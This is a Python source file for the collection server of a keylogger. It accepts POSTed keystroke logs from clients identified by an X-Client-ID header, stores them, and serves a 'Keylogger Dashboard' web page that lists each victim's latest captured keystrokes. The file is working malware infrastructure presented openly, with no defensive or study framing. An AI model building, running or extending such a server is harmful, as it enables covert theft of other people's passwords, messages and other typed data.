from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os

keylog_data = {}

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        client_id = self.headers.get('X-Client-ID', 'unknown')
        
        if client_id not in keylog_data:
            keylog_data[client_id] = []
        
        keylog_data[client_id].append(post_data.decode('utf-8'))
        
        print(f"[LOG] Received from {client_id}: {post_data.decode('utf-8')[:50]}")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = '<html><body style="background:#111; color:#0f0; font-family:monospace;">'
        html += '<h1>Keylogger Dashboard</h1>'
        html += '<table border="1" width="100%">'
        html += '<tr><th>Client ID</th><th>Last Activity</th></tr>'
        
        for id, logs in keylog_data.items():
            last_log = logs[-1] if logs else ''
            if len(last_log) > 50:
                last_log = last_log[:50]
            html += f'<tr><td>{id}</td><td>{last_log}</td></tr>'
        
        html += '</table></body></html>'
        self.wfile.write(html.encode())

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), Handler)
    print("Server running on port 8080...")
    server.serve_forever()